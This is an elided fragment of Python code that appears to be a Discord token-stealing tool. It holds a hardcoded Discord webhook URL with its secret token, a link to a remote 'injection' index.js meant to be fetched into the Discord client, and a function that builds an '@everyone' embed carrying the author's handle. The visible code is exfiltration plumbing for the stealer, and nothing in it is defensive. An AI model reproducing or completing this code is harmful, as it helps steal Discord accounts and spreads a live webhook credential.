...
wh00k = "https://discord.com/api/webhooks/1108618949324709968/SkvvwslChHcJtx4UzC7RJ6s1ecbkhdPtW2OMSLOUXH4K_XwqdfFvZRhvZNAQva-zzNWT"
inj_url = "https://raw.githubusercontent.com/lukyy7/injection/main/index.js"
...
def sendEmbed():
	...
	data = {
		"content": "@everyone",
		"username": "dzn",
		"avatar_url": "https://media.discordapp.net/attachments/1111307552936968192/1111330984030384298/icon.png?width=316&height=316"
	}
	...
	data['embeds'] = [
		{
			...
			"footer": {
				"text": "Lukyy#0001",
				"icon_url": "https://media.discordapp.net/attachments/1111307552936968192/1111330984030384298/icon.png?width=316&height=316"
			},
			"thumbnail": {
				"url": "https://media.discordapp.net/attachments/1111307552936968192/1111330984030384298/icon.png?width=316&height=316"
			},
			"fields": [
				{
